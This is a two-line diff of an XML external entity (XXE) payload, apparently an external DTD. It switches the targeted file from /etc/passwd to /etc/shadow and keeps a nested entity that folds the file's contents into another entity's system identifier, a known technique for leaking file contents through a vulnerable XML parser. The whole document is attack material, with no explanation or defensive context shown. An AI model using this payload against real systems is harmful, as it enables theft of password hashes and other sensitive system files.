@@ -1,2 +1,2 @@
-<!ENTITY % d SYSTEM "file:///etc/passwd"> 
+<!ENTITY % d SYSTEM "file:///etc/shadow"> 
 <!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
